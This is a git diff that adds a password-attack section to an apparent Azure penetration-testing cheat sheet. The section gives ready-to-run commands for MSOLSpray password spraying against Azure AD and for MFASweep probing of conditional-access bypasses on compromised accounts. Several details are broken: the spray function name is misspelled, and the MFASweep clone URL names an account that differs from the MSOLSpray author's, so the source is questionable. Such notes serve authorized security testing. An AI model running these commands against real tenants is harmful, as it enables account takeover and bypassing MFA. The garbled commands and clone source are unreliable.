@@ -8,6 +8,11 @@ Public enumeration
 
 * [1. Enumerate storage account](#enumerate-storage-account)
 
+Password attacks
+
+* [1. Guessing Azure AD credentials using MSOLSpray](#Guessing-Azure-AD-credentials-using-MSOLSpray)
+* [2. Identify conditional access policy bypass using MFASweep](#Identify-conditional-access-policy-bypass-using-MFASweep)
+
 
 ##### ➤ AWS CSP
 
@@ -74,3 +79,45 @@ Add "/?restype=container&comp=list"
 ```
 https://kiosecstorage.blob.core.windows.net/public/?restype=container&comp=list
 ```
+
+
+
+``` ```
+``` ```
+## Guessing Azure AD credentials using MSOLSpray
+
+MSOLSpray takes a list of user and account a list of password and try them against the Azure authentication portal. 
+
+##### Install MSOLSpray
+```
+git clone https://github.com/dafthack/MSOLSpray.git
+```
+
+##### Execute MSOLSpray
+```
+cd .\MSOLSpray\
+Import-Module .\MSOLSpray.ps1
+
+Invoke-MSOLSray -UserList .\userlist.txt -Password myweakpassword123 
+```
+
+``` ```
+``` ```
+## Identify conditional access policy bypass using MFASweep
+
+MFASweep allows to detect the conditional access policy bypasses against a compromised user accounts.
+
+##### Install MFASweep
+```
+git clone https://github.com/dafhazck/MFASweep.git
+```
+
+##### Execute MFASweep
+```
+cd .\MFASweep\
+Import-Module .\MFASweep.ps1
+
+Invoke-MFASweep -Username kiosec@myazurelab.com -Password myweakpassword123
+```
+
+
